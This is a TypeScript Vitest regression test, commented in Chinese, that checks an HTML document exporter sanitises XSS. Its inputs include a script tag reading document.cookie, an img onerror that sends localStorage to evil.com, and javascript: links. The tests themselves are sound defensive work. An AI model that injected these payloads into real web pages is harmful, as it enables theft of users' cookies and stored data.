/**
 * QA 回归验证：S6 HTML 导出消毒（documentExporter / HTMLExporter.convertToHTML）
 *
 * 架构师审查报告：HTMLExporter.convertToHTML 对内容完全不转义，
 * 文档内 <script>/onerror 原样进入导出 HTML 并在浏览器执行；旧 exportFile('html')
 * 把未渲染 Markdown 源码直接包进 HTML。
 * 修复要求：marked 渲染 + DOMPurify 消毒（失败时整段转义兜底）、title 转义。
 *
 * 通过 documentExporter.export('html') 走真实导出管道，读取生成的 Blob 文本断言
 * 输出中不得原样透传 <script>/onerror/javascript: 等危险内容。
 */

import { describe, it, expect, beforeAll, vi } from 'vitest';
import { documentExporter } from '@/lib/export';

describe('S6 HTML 导出消毒', () => {
  beforeAll(() => {
    // jsdom 未实现 createObjectURL/revokeObjectURL，导出下载环节需要 stub
    (URL as unknown as { createObjectURL: unknown }).createObjectURL = vi.fn(() => 'blob:mock');
    (URL as unknown as { revokeObjectURL: unknown }).revokeObjectURL = vi.fn();
  });

  // jsdom 的 Blob 未实现 .stream()/.text()，用 FileReader 读取
  function readBlobText(blob: Blob): Promise<string> {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result));
      reader.onerror = () => reject(reader.error);
      reader.readAsText(blob);
    });
  }

  async function exportHtml(markdown: string, title = '测试文档'): Promise<string> {
    const result = await documentExporter.export(markdown, title, { format: 'html' });
    expect(result.success).toBe(true);
    return readBlobText(result.data as Blob);
  }

  it('文档内 <script> 不得原样透传（存储型 XSS）', async () => {
    const md = `# 标题\n\n<script>document.cookie</script>\n\n正文内容`;
    const html = await exportHtml(md);
    expect(html).not.toContain('<script');
    // 正文仍保留
    expect(html).toContain('正文内容');
  });

  it('<img onerror> 事件处理器应被剥离', async () => {
    const md = `<img src="x" onerror="fetch('https://evil.com/?d='+localStorage)">`;
    const html = await exportHtml(md);
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('evil.com');
  });

  it('javascript: 链接应被消毒（不可执行）', async () => {
    const md = `[点击这里](javascript:alert(document.cookie))`;
    const html = await exportHtml(md);
    expect(html).not.toContain('javascript:');
  });

  it('标题中的 HTML 应被转义', async () => {
    const md = `正文`;
    const html = await exportHtml(md, `<img src=x onerror=alert(1)>`);
    expect(html).toContain('&lt;img');
    expect(html).not.toContain('<title><img');
  });

  it('正常 Markdown 内容应被渲染并保留', async () => {
    const md = `# 一级标题\n\n- 列表项 A\n- 列表项 B`;
    const html = await exportHtml(md);
    expect(html).toContain('一级标题');
    expect(html).toContain('列表项 A');
    // 是渲染后的 HTML，而不是原样 Markdown 源码（S6 语义修复）
    expect(html).toContain('<h1');
    expect(html).toContain('<ul');
  });
});
